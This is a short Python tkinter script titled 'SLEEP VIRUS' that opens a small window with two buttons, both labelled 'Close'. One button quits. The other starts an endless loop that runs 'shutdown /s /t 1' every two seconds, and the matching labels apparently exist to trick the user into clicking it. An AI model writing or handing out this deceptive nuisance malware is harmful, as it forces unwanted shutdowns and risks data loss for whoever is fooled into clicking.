# Import
import time
import tkinter as tk
import os

# Code
root = tk.Tk()
root.title("SLEEP VIRUS")
root.geometry("300x100")
root.resizable(0, 0)

def start_virus():
    while True:
        time.sleep(2)
        os.system("shutdown /s /t 1")

def stop_virus():
    quit()

label = tk.Label(root, text="IT SLEEP TIME")
label.pack()

button = tk.Button(root, text="Close", command=start_virus)
button.pack()

stop = tk.Button(root, text="Close", command=stop_virus)
stop.pack()

root.mainloop()
